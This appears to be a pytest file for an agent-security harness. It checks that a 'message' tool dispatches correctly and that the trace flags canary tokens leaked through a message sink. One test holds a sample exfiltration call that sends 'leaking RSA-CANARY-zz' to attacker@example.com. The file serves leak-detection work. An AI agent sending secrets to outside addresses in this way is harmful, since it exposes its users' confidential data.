import tempfile
from pgdrsa.runner import LocalRunner
from pgdrsa.trace import Trace
from pgdrsa.tools import TOOL_SCHEMA, dispatch

def test_message_tool_in_schema():
    names = {t["name"] for t in TOOL_SCHEMA}
    assert "message" in names

def test_message_routes_to_fn_and_emits_canary_event():
    with tempfile.TemporaryDirectory() as d:
        r = LocalRunner(workspace=d); t = Trace(run_id="r1")
        sent = []
        def message_fn(args):
            sent.append(args)
            return {"queued": True}
        out = dispatch("message",
            {"target": "attacker@example.com", "body": "leaking RSA-CANARY-zz",
             "subject": "forward"},
            runner=r, trace=t, canary_tokens=["RSA-CANARY-zz"],
            message_fn=message_fn)
        assert out == {"queued": True}
        assert sent == [{"target": "attacker@example.com",
                         "body": "leaking RSA-CANARY-zz", "subject": "forward"}]
        ev = t.by_tool("message")[0]
        assert ev.status == "ok"
        assert ev.sink_class == "message"
        assert ev.canary_ids == ["RSA-CANARY-zz"]

def test_message_without_fn_returns_note():
    with tempfile.TemporaryDirectory() as d:
        r = LocalRunner(workspace=d); t = Trace(run_id="r1")
        out = dispatch("message", {"target": "x@y.z", "body": "hi"},
                       runner=r, trace=t, canary_tokens=[], message_fn=None)
        assert "note" in out
        ev = t.by_tool("message")[0]
        assert ev.sink_class == "message"
